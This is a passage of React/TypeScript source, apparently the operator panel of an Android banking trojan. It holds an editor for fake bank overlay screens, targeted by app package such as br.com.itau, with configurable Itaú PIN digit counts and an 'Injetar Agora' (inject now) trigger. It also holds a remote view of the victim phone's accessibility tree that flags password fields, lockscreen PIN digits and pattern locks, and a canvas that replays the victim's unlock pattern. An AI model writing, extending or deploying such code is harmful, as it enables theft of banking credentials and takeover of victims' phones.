              headerColor="bg-gradient-to-r from-[#4d7c0f] to-rose-700"
            >
              <div className="flex flex-col md:flex-row text-slate-200 h-full overflow-hidden bg-[#2b0903]/95">
                {/* Lateral Esquerda - Selector de Bancos e Form de Edição */}
                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden h-full">
                  <div className="flex-1 overflow-y-auto p-4 space-y-4">
                    {/* Selector de Presets */}
                    <div>
                      <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Selecione o Banco</label>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                        {bankScreens.map(screen => {
                          const isSelected = selectedPresetScreenId === screen.id;
                          return (
                            <button
                              key={screen.id}
                              onClick={() => selectPreset(screen.id)}
                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                isSelected
                                  ? 'bg-gradient-to-r from-[#65a30d]/30 to-[#84cc16]/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                              }`}
                            >
                              {screen.name.split('-')[0].trim()}
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    <div className="border-t border-[#24242a] my-2"></div>

                    {/* Inputs de customização */}
                    <div className="space-y-3">
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Pacote Alvo (Gatilho)</label>
                        <input
                          type="text"
                          value={editBankPackage}
                          onChange={(e) => setEditBankPackage(e.target.value)}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                          placeholder="Ex: br.com.itau"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Logo</label>
                          <input
                            type="text"
                            value={editBankLogoText}
                            onChange={(e) => {
                              setEditBankLogoText(e.target.value);
                              handleUpdateCurrentScreenProperty('logo', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Título da Ação</label>
                          <input
                            type="text"
                            value={editBankTitle}
                            onChange={(e) => {
                              setEditBankTitle(e.target.value);
                              handleUpdateCurrentScreenProperty('title', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                      </div>
                      <div>
                        <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Descrição</label>
                        <textarea
                          value={editBankDesc}
                          onChange={(e) => {
                            setEditBankDesc(e.target.value);
                            handleUpdateCurrentScreenProperty('desc', e.target.value);
                          }}
                          rows={2}
                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Placeholder do Campo</label>
                          <input
                            type="text"
                            value={editBankPlaceholder}
                            onChange={(e) => {
                              setEditBankPlaceholder(e.target.value);
                              handleUpdateCurrentScreenProperty('placeholder', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Texto do Botão</label>
                          <input
                            type="text"
                            value={editBankButtonText}
                            onChange={(e) => {
                              setEditBankButtonText(e.target.value);
                              handleUpdateCurrentScreenProperty('buttonText', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                          />
                        </div>
                      </div>
                      {selectedPresetScreenId.includes('itau') && (
                        <div className="bg-orange-950/40 border border-[#ef4444]/50 rounded-md p-2.5 my-2">
                          <label className="block text-[11px] font-bold text-[#f87171] uppercase tracking-wider mb-1 flex items-center gap-1">
                            <span></span> Quantidade de Dígitos (Bolinhas):
                          </label>
                          <select
                            value={editBankDigitsOption}
                            onChange={(e) => handleUpdateItauDigits(e.target.value)}
                            className="w-full bg-slate-950/90 border border-[#ef4444]/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-[#f87171] font-mono font-bold"
                          >
                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão Itaú]</option>
                            <option value="4,4">4 Dígitos em Ambos os Passos (4 Bolinhas)</option>
                            <option value="6,6">6 Dígitos em Ambos os Passos (6 Bolinhas)</option>
                            <option value="4,6">4 Dígitos (Acesso) + 6 Dígitos (Transação)</option>
                          </select>
                        </div>
                      )}

                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Fundo (Cor/Gradient)</label>
                          <input
                            type="text"
                            value={editBankBgColor}
                            onChange={(e) => {
                              setEditBankBgColor(e.target.value);
                              handleUpdateCurrentScreenProperty('bgColor', e.target.value);
                            }}
                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                          />
                        </div>
                        <div>
                          <label className="block text-[11px] font-bold text-slate-400 uppercase mb-1">Cor do Botão</label>
                          <div className="flex gap-1.5">
                            <input
                              type="color"
                              value={editBankBtnColor.startsWith('#') && editBankBtnColor.length === 7 ? editBankBtnColor : '#ef4444'}
                              onChange={(e) => {
                                setEditBankBtnColor(e.target.value);
                                handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-8 h-8 p-0 border-0 bg-transparent rounded cursor-pointer flex-shrink-0"
                            />
                            <input
                              type="text"
                              value={editBankBtnColor}
                              onChange={(e) => {
                                setEditBankBtnColor(e.target.value);
                                handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                              }}
                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                      <button
                        onClick={() => setShowBankVisualEditor(true)}
                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                      >
                         Editor Visual
                      </button>
                      <button
                        onClick={() => {
                          const compiled = getCompiledBankTemplate();
                          if (compiled) applyCustomBlackScreen(compiled, editBankPackage);
                        }}
                        className="flex-1 py-2.5 bg-gradient-to-r from-[#65a30d] to-[#ef4444] hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
                      >
                         Injetar Agora
                      </button>
                      <button
                        onClick={saveCustomBankMapping}
                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                      >
                         Salvar Gatilho
                      </button>
                    </div>
                  </div>
                </div>

                {/* Lateral Direita - Live Preview */}
                <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative h-full">
                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                  
                  {/* Celular Mockup */}
                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                       style={{ background: editBankBgColor }}>
                    
                    {/* Speaker Notch */}
                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                    </div>

                    {/* Conteúdo Renderizado Dinamicamente */}
                    {(() => {
                      const screen = bankScreens.find(s => s.id === selectedPresetScreenId);
                      if (!screen) return null;
                      
                      return (
                        <div className="flex-1 relative w-full h-full p-4 flex flex-col justify-between">
                          <div className="w-full h-full relative">
                            {screen.elements.map((el: any) => {
                              // Escalar do tamanho do Android (360x780) para o tamanho do mockup (264x504)
                              const mockupWidth = 264;
                              const mockupHeight = 504;
                              const scaleX = mockupWidth / 360;
                              const scaleY = mockupHeight / 780;
                              
                              return (
                                <div
                                  key={el.id}
                                  className="absolute select-none pointer-events-none"
                                  style={{
                                    left: el.x * scaleX,
                                    top: el.y * scaleY,
                                    width: el.width * scaleX,
                                    height: el.height * scaleY,
                                    opacity: (el.opacity || 100) / 100
                                  }}
                                >
                                  {el.type === 'text' && (
                                    <div
                                      style={{
                                        color: el.color,
                                        fontSize: `${(el.fontSize || 16) * scaleX}px`,
                                        fontWeight: el.fontWeight,
                                        textAlign: el.textAlign || 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        wordBreak: 'break-word'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'logo' && (
                                    <div
                                      style={{
                                        color: el.color || '#ffffff',
                                        fontSize: `${(el.fontSize || 22) * scaleX}px`,
                                        fontWeight: 'bold',
                                        textAlign: 'center',
                                        width: '100%',
                                        height: '100%',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        textTransform: 'lowercase'
                                      }}
                                    >
                                      {el.content}
                                    </div>
                                  )}
                                  {el.type === 'input' && (
                                    <div
                                      className="w-full h-full flex flex-col justify-center px-3 border"
                                      style={{
                                        backgroundColor: el.backgroundColor || 'rgba(22, 6, 6, 0.6)',
                                        borderColor: el.borderColor || '#ec7000',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        color: el.color || '#ffffff',
                                        fontSize: `${11 * scaleX}px`
                                      }}
                                    >
                                      <span className="text-gray-400 truncate">
                                        {el.placeholder || 'Campo de entrada'}
                                      </span>
                                    </div>
                                  )}
                                  {el.type === 'button' && (
                                    <div
                                      className="w-full h-full flex items-center justify-center font-bold font-sans shadow-md text-center"
                                      style={{
                                        backgroundColor: el.backgroundColor || '#ec7000',
                                        color: el.color || '#ffffff',
                                        borderRadius: `${(el.borderRadius || 12) * scaleX}px`,
                                        fontSize: `${12 * scaleX}px`
                                      }}
                                    >
                                      {el.content || 'Confirmar'}
                                    </div>
                                  )}
                                  {el.type === 'image' && (
                                    <div className="w-full h-full flex items-center justify-center overflow-hidden">
                                      {el.imageUrl ? (
                                        <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                      ) : (
                                        <span className="text-lg"></span>
                                      )}
                                    </div>
                                  )}
                                  {(el.type === 'rectangle' || el.type === 'circle') && (
                                    <div
                                      className="w-full h-full"
                                      style={{
                                        backgroundColor: el.backgroundColor,
                                        borderRadius: el.type === 'circle' ? '50%' : `${(el.borderRadius || 0) * scaleX}px`
                                      }}
                                    />
                                  )}
                                  {el.type === 'fingerprint' && (
                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-[#2a2a31]/20 rounded bg-[#121214]/10">
                                      <div
                                        className="rounded-full p-2 border animate-pulse"
                                        style={{ borderColor: el.biometricColor || '#00ff00' }}
                                      >
                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}></span>
                                      </div>
                                    </div>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>
              </div>
            </FloatingWindow>
          </div>
        </div>
      )}

      {/* ¼ LIGHTBOX MODAL PARA IMAGENS */}
      {lightboxImage && (
        <div 
          className="fixed inset-0 bg-black/95 flex flex-col items-center justify-center z-[100] animate-fadeIn"
          onClick={() => setLightboxImage(null)}
        >
          <div className="absolute top-4 right-4 flex items-center gap-3" onClick={(e) => e.stopPropagation()}>
            <button
              onClick={() => {
                const link = document.createElement('a');
                link.href = lightboxImage;
                link.download = lightboxName;
                link.click();
              }}
              className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-xs rounded-md flex items-center gap-1.5 transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)]"
            >
              <Download className="w-3.5 h-3.5" />
              Baixar Imagem
            </button>
            <button
              onClick={() => setLightboxImage(null)}
              className="p-2 bg-[#121214]/80 border border-[#2a2a31] hover:border-[#8b8b94] text-slate-400 hover:text-white rounded-md transition-all"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
          
          <div 
            className="max-w-[90vw] max-h-[80vh] rounded-md overflow-hidden border border-[#24242a] shadow-[0_10px_50px_rgba(0,0,0,0.8)] relative"
            onClick={(e) => e.stopPropagation()}
          >
            <img 
              src={lightboxImage} 
              alt={lightboxName} 
              className="max-w-full max-h-[80vh] object-contain"
            />
            <div className="absolute bottom-0 left-0 right-0 bg-slate-950/80 backdrop-blur border-t border-[#24242a]/50 p-3 text-center">
              <span className="text-white text-xs font-bold font-mono">{lightboxName}</span>
            </div>
          </div>
        </div>
      )}

      {/*  Robô Assistente Interativo com Guia de Funções e Tela Preta */}
      <RobotAssistant 
        initialCategory="device_control" 
        isOpen={showRobotTutorial} 
        onOpenChange={setShowRobotTutorial} 
      />
    </div>
  );
}

// 🪟 Componente de Janela Flutuante Inline
interface FloatingWindowProps {
  id: string;
  title: string;
  children: React.ReactNode;
  isOpen: boolean;
  position: { x: number; y: number };
  size: { width: number; height: number };
  zIndex: number;
  onClose: () => void;
  onFocus: () => void;
  onDrag: (x: number, y: number) => void;
  onResize: (width: number, height: number) => void;
  headerColor?: string;
}

function FloatingWindow({ 
  title, 
  children, 
  isOpen, 
  position, 
  size, 
  zIndex, 
  onClose, 
  onFocus, 
  onDrag, 
  onResize,
  headerColor = 'bg-[#2a2a31]'
}: FloatingWindowProps) {
  const [isDragging, setIsDragging] = useState(false);
  const [isResizing, setIsResizing] = useState(false);
  const [isMinimized, setIsMinimized] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const dragStart = useRef({ x: 0, y: 0, posX: 0, posY: 0 });
  const resizeStart = useRef({ width: 0, height: 0, x: 0, y: 0 });

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 640);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      if (isDragging) {
        const newX = Math.max(0, e.clientX - dragStart.current.x + dragStart.current.posX);
        const newY = Math.max(50, e.clientY - dragStart.current.y + dragStart.current.posY);
        onDrag(newX, newY);
      }
      if (isResizing) {
        const newWidth = Math.max(250, resizeStart.current.width + (e.clientX - resizeStart.current.x));
        const newHeight = Math.max(200, resizeStart.current.height + (e.clientY - resizeStart.current.y));
        onResize(newWidth, newHeight);
      }
    };

    const handleTouchMove = (e: TouchEvent) => {
      if (isDragging && e.touches[0]) {
        const touch = e.touches[0];
        const newX = Math.max(0, touch.clientX - dragStart.current.x + dragStart.current.posX);
        const newY = Math.max(50, touch.clientY - dragStart.current.y + dragStart.current.posY);
        onDrag(newX, newY);
      }
    };
    
    const handleEnd = () => {
      setIsDragging(false);
      setIsResizing(false);
    };
    
    if (isDragging || isResizing) {
      document.addEventListener('mousemove', handleMouseMove);
      document.addEventListener('mouseup', handleEnd);
      document.addEventListener('touchmove', handleTouchMove, { passive: false });
      document.addEventListener('touchend', handleEnd);
    }
    
    return () => {
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleEnd);
      document.removeEventListener('touchmove', handleTouchMove);
      document.removeEventListener('touchend', handleEnd);
    };
  }, [isDragging, isResizing, onDrag, onResize]);
  
  if (!isOpen) return null;

  const mobileStyle: React.CSSProperties = isMobile ? {
    left: '4px',
    right: '4px',
    width: isMinimized ? '260px' : 'calc(100vw - 8px)',
    maxWidth: '100vw',
    top: isMinimized ? 'auto' : '55px',
    bottom: isMinimized ? '10px' : '10px',
    height: isMinimized ? 'auto' : 'calc(100vh - 70px)',
    maxHeight: '100vh',
    zIndex: zIndex,
  } : {
    left: position.x,
    top: position.y,
    width: isMinimized ? 250 : size.width,
    height: isMinimized ? 'auto' : size.height,
    zIndex: zIndex,
  };
  
  return (
    <div
      className="fixed bg-[#121214] rounded-md shadow-[0_10px_40px_rgba(0,0,0,0.6)] border border-[#2a2a31]/30 overflow-hidden pointer-events-auto transition-all"
      style={mobileStyle}
      onClick={onFocus}
    >
      {/* Header */}
      <div
        className={`${headerColor} px-3 py-2 flex items-center justify-between cursor-grab active:cursor-grabbing select-none touch-none`}
        onMouseDown={(e) => {
          if ((e.target as HTMLElement).closest('.window-btn')) return;
          setIsDragging(true);
          dragStart.current = { x: e.clientX, y: e.clientY, posX: position.x, posY: position.y };
          onFocus();
        }}
        onTouchStart={(e) => {
          if ((e.target as HTMLElement).closest('.window-btn')) return;
          if (e.touches[0]) {
            setIsDragging(true);
            dragStart.current = { x: e.touches[0].clientX, y: e.touches[0].clientY, posX: position.x, posY: position.y };
            onFocus();
          }
        }}
      >
        <div className="flex items-center space-x-2 text-white font-bold text-xs truncate max-w-[70%]">
          <Move className="w-4 h-4 text-[#ef4444] shrink-0" />
          <span className="truncate">{title}</span>
        </div>
        
        <div className="flex items-center space-x-1 shrink-0">
          <button
            className="window-btn p-1.5 hover:bg-white/20 active:bg-white/30 rounded-md transition-all"
            onClick={() => setIsMinimized(!isMinimized)}
          >
            {isMinimized ? <Maximize2 className="w-3.5 h-3.5 text-white" /> : <Minimize2 className="w-3.5 h-3.5 text-white" />}
          </button>
          <button className="window-btn p-1.5 hover:bg-[#ef4444] active:bg-[#ef4444] rounded-md transition-all" onClick={onClose}>
            <X className="w-3.5 h-3.5 text-white" />
          </button>
        </div>
      </div>
      
      {/* Content */}
      {!isMinimized && (
        <div className="h-[calc(100%-40px)] w-full overflow-hidden">
          {children}
        </div>
      )}
      
      {/* Resize Handle (Desktop Only) */}
      {!isMinimized && !isMobile && (
        <div
          className="absolute bottom-0 right-0 w-4 h-4 cursor-se-resize"
          onMouseDown={(e) => {
            e.stopPropagation();
            setIsResizing(true);
            resizeStart.current = { width: size.width, height: size.height, x: e.clientX, y: e.clientY };
            onFocus();
          }}
        >
          <svg className="w-4 h-4 text-[#ef4444]/60" viewBox="0 0 24 24" fill="currentColor">
            <path d="M22 22H20V20H22V22ZM22 18H20V16H22V18ZM18 22H16V20H18V22ZM22 14H20V12H22V14ZM18 18H16V16H18V18ZM14 22H12V20H14V22Z" />
          </svg>
        </div>
      )}
    </div>
  );
}

type ScreenReaderNode = {
  bounds?: { x: number; y: number; w: number; h: number };
  children?: ScreenReaderNode[];
  text?: string;
  desc?: string;
  hint?: string; // Hint do campo de texto
  class?: string;
  id?: string;
  clickable?: boolean;
  editable?: boolean;
  password?: boolean;
  focused?: boolean;
  isKeyboard?: boolean;
  checked?: boolean;
  enabled?: boolean;
  scrollable?: boolean;
  longClickable?: boolean;
  selected?: boolean;
  // Elementos de lockscreen
  isLockScreen?: boolean;
  isLockElement?: boolean;
  isPinDigit?: boolean;
  isPatternLock?: boolean;
  isSwipeUnlock?: boolean;
  windowType?: number;
  windowPackage?: string;
  patternGrid?: { x: number; y: number; r?: number }[];
  gridRows?: number;
  gridCols?: number;
  swipeHint?: { sx: number; sy: number; ex: number; ey: number };
};

const safeRoundRect = (
  ctx: CanvasRenderingContext2D,
  x: number,
  y: number,
  w: number,
  h: number,
  r: number
) => {
  if (typeof (ctx as any).roundRect === 'function') {
    try {
      (ctx as any).roundRect(x, y, w, h, r);
      return;
    } catch {
      // Fallback below
    }
  }
  const rad = Math.min(Math.abs(r), Math.abs(w) / 2, Math.abs(h) / 2);
  ctx.moveTo(x + rad, y);
  ctx.arcTo(x + w, y, x + w, y + h, rad);
  ctx.arcTo(x + w, y + h, x, y + h, rad);
  ctx.arcTo(x, y + h, x, y, rad);
  ctx.arcTo(x, y, x + w, y, rad);
};

const ScreenReaderCanvas = ({ 
  hierarchy, 
  hoveredNode, 
  textScale = 1.0, 
  designTheme = 'cyan', 
  hideUntyped = false,
  opacity = 0.7,
  showGrid = true,
  cornerStyle = 'brackets',
  showCoords = false,
  patternMode = false,
  patternDrawn = [],
  patternDragPos = null
}: { 
  hierarchy?: ScreenReaderNode; 
  scale?: number; 
  maxHeight?: number; 
  hoveredNode?: ScreenReaderNode | null;
  textScale?: number;
  designTheme?: 'cyan' | 'matrix' | 'neon-red' | 'purple-glowing';
  hideUntyped?: boolean;
  opacity?: number;
  showGrid?: boolean;
  cornerStyle?: 'brackets' | 'full-border' | 'dots' | 'none';
  showCoords?: boolean;
  patternMode?: boolean;
  patternDrawn?: number[];
  patternDragPos?: { x: number; y: number } | null;
}) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Resolução real obtida dinamicamente da hierarquia com fallback seguro
  const devW = hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
  const devH = hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    
    const ctx = canvas.getContext('2d', { alpha: false });
    if (!ctx) return;

    try {
      const dpr = window.devicePixelRatio || 1;
      const targetW = Math.floor(devW * dpr);
      const targetH = Math.floor(devH * dpr);
      
      if (canvas.width !== targetW || canvas.height !== targetH) {
        canvas.width = targetW;
        canvas.height = targetH;
      }
      
      ctx.setTransform(1, 0, 0, 1, 0, 0);
      ctx.scale(dpr, dpr);
      
      // Fundo escuro tecnológico
      ctx.fillStyle = '#0c0202';
      ctx.fillRect(0, 0, devW, devH);

      // Grade de blueprint cibernética (condicional)
      if (showGrid) {
        ctx.strokeStyle = 'rgba(239, 68, 68, 0.08)';
        ctx.lineWidth = 0.5;
        const gridSize = 25;
        for (let gx = 0; gx < devW; gx += gridSize) {
          ctx.beginPath();
          ctx.moveTo(gx, 0);
          ctx.lineTo(gx, devH);
          ctx.stroke();
        }
        for (let gy = 0; gy < devH; gy += gridSize) {
          ctx.beginPath();
          ctx.moveTo(0, gy);
          ctx.lineTo(devW, gy);
          ctx.stroke();
        }
      }

      if (hierarchy) {
        // Coleta TODOS os elementos visíveis (folhas sem filhos OU com texto)
        const raw: ScreenReaderNode[] = [];
        collectAllVisibleNodes(hierarchy, raw);

        raw.sort((a, b) => {
          const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
          const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
          return areaB - areaA;
        });

        const allNodes: ScreenReaderNode[] = [];
        for (const n of raw) {
          const t = ((n.text || '').trim() || (n.desc || '').trim()).toLowerCase();
          if (t && n.bounds) {
            const cx = n.bounds.x + n.bounds.w / 2;
            const cy = n.bounds.y + n.bounds.h / 2;
            let dup = false;
            for (const k of allNodes) {
              const kt = ((k.text || '').trim() || (k.desc || '').trim()).toLowerCase();
              if (kt !== t || !k.bounds) continue;
              if (Math.abs(cx - (k.bounds.x + k.bounds.w / 2)) < 110 && Math.abs(cy - (k.bounds.y + k.bounds.h / 2)) < 130) { dup = true; break; }
            }
            if (dup) continue;
          }
          allNodes.push(n);
        }
        
        // Desenha todos os elementos
        allNodes.forEach(node => {
          if (hideUntyped && !node.text?.trim() && !node.desc?.trim() && !node.hint?.trim() && !node.password && !node.editable) {
            return;
          }
          drawElement(ctx, node, textScale, designTheme, opacity, cornerStyle, showCoords);
        });
      }

      // Desenha destaque do item hovered na lista lateral
      if (hoveredNode && hoveredNode.bounds) {
        const { x, y, w, h } = hoveredNode.bounds;
        ctx.save();
        ctx.fillStyle = 'rgba(239, 68, 68, 0.25)'; // Fundo ciano semi-transparente
        ctx.strokeStyle = '#ef4444'; // Borda ciano neon brilhante
        ctx.lineWidth = 3.5;
        ctx.shadowColor = '#ef4444';
        ctx.shadowBlur = 12;
        
        const radius = Math.min(8, w / 6, h / 6);
        ctx.beginPath();
        safeRoundRect(ctx, x, y, w, h, radius);
        ctx.fill();
        ctx.stroke();
        ctx.restore();
      }

      // Desenho Interativo do Pattern Lock na Tela V2
      if (patternMode || (patternDrawn && patternDrawn.length > 0)) {
        ctx.save();
        
        let bx = devW * 0.125;
        let by = devH * 0.42;
        let bw = devW * 0.75;
        let bh = bw;

        const findPNodeCanvas = (node: any): any => {
          if (!node) return null;
          const candidates: { score: number; node: any }[] = [];

          const search = (n: any) => {
            if (!n) return;
            const resId = (n.resourceId || '').toLowerCase();
            const cls = (n.className || '').toLowerCase();
            const txt = (n.text || '').toLowerCase();
            const isPattern = n.isPatternLock || resId.includes('pattern') || cls.includes('pattern') || txt.includes('pattern');

            if (isPattern && n.bounds && n.bounds.w > 30 && n.bounds.h > 30) {
              let score = 0;
              if (resId.includes('lockpatternview') || cls.includes('lockpatternview')) score += 100;
              const aspect = n.bounds.w / n.bounds.h;
              if (aspect >= 0.85 && aspect <= 1.15) score += 50;
              if (n.isPatternLock) score += 30;
              candidates.push({ score, node: n });
            }

            if (n.children) {
              for (const child of n.children) {
                search(child);
              }
            }
          };

          search(node);
          if (candidates.length === 0) return null;
          candidates.sort((a, b) => b.score - a.score);
          return candidates[0].node;
        };
        const pNode = findPNodeCanvas(hierarchy);
        if (pNode && pNode.bounds) {
          bw = pNode.bounds.w;
          bh = pNode.bounds.h;
          bx = pNode.bounds.x;
          by = pNode.bounds.y;
          if (bh > bw * 1.05) {
            const side = bw;
            by = pNode.bounds.y + (bh - side);
            bh = side;
          }
        }

        // Fundo semitransparente da grade
        ctx.fillStyle = 'rgba(18, 3, 3, 0.75)';
        ctx.strokeStyle = '#ef4444';
        ctx.lineWidth = 2;
        ctx.beginPath();
        safeRoundRect(ctx, bx - 12, by - 12, bw + 24, bh + 24, 16);
        ctx.fill();
        ctx.stroke();

        const dotsMap: { [key: number]: { x: number; y: number; r: number } } = {};
        const rows = 3;
        const cols = 3;
        const dotR = Math.min(bw / (cols * 4.5), bh / (rows * 4.5));

        for (let r = 0; r < rows; r++) {
          for (let c = 0; c < cols; c++) {
            const id = r * 3 + c + 1;
            const dx = bx + (c + 0.5) * (bw / cols);
            const dy = by + (r + 0.5) * (bh / rows);
            dotsMap[id] = { x: dx, y: dy, r: dotR };
          }
        }

        // Linhas de íconexão entre os pontos já selecionados
        if (patternDrawn && patternDrawn.length > 0) {
          ctx.beginPath();
          for (let i = 0; i < patternDrawn.length; i++) {
            const pId = patternDrawn[i];
            const pDot = dotsMap[pId];
            if (pDot) {
              if (i === 0) ctx.moveTo(pDot.x, pDot.y);
              else ctx.lineTo(pDot.x, pDot.y);
            }
          }

          if (patternDragPos) {
            ctx.lineTo(patternDragPos.x, patternDragPos.y);
          }

          ctx.strokeStyle = '#ef4444';
          ctx.lineWidth = 6;
          ctx.shadowColor = '#ef4444';
          ctx.shadowBlur = 14;
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round';
          ctx.stroke();
          ctx.shadowBlur = 0;
        }

        // Renderiza os 9 pontos
        for (let id = 1; id <= 9; id++) {
          const p = dotsMap[id];
          if (!p) continue;
          const isSelected = patternDrawn && patternDrawn.includes(id);

          ctx.save();
          if (isSelected) {
            ctx.fillStyle = '#ef4444';
            ctx.shadowColor = '#ef4444';
            ctx.shadowBlur = 16;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r * 1.5, 0, Math.PI * 2);
            ctx.fill();

            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 2.5;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r * 2.2, 0, Math.PI * 2);
            ctx.stroke();
          } else {
            ctx.fillStyle = 'rgba(239, 68, 68, 0.85)';
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
            ctx.fill();
          }

          ctx.shadowBlur = 0;
          ctx.font = 'bold 11px sans-serif';
          ctx.fillStyle = isSelected ? '#000' : 'rgba(255,255,255,0.85)';
          ctx.textAlign = 'center';
          ctx.textBaseline = 'middle';
          ctx.fillText(id.toString(), p.x, p.y);
          ctx.restore();
        }

        // Banner informativo
        ctx.save();
        ctx.fillStyle = 'rgba(239, 68, 68, 0.9)';
        ctx.fillRect(0, 0, devW, 30);
        ctx.font = 'bold 12px sans-serif';
        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        const pText = (patternDrawn && patternDrawn.length > 0) ? patternDrawn.join(' - ') : 'Arraste entre os pontos (1 a 9)';
        ctx.fillText(` MODO PADRO: ${pText}`, devW / 2, 15);
        ctx.restore();

        ctx.restore();
      }
    } catch (err) {
      console.warn("ScreenReaderCanvas render error caught:", err);
    }
  }, [hierarchy, devW, devH, hoveredNode, textScale, designTheme, hideUntyped, opacity, showGrid, cornerStyle, showCoords, patternMode, patternDrawn, patternDragPos]);

  return (
    <canvas
      ref={canvasRef}
      data-screen="true"
      className="block w-full h-full"
      style={{
        width: '100%',
        height: '100%',
        willChange: 'contents', // Hint para o browser otimizar
      }}
    />
  );
};

// Detecta se é um campo de input/senha
const isInputField = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  return (
    node.editable === true ||
    node.password === true ||
    className.includes('edittext') ||
    className.includes('textinput') ||
    className.includes('inputfield') ||
    className.includes('textfield')
  );
};

// Detecta se é tecla do teclado
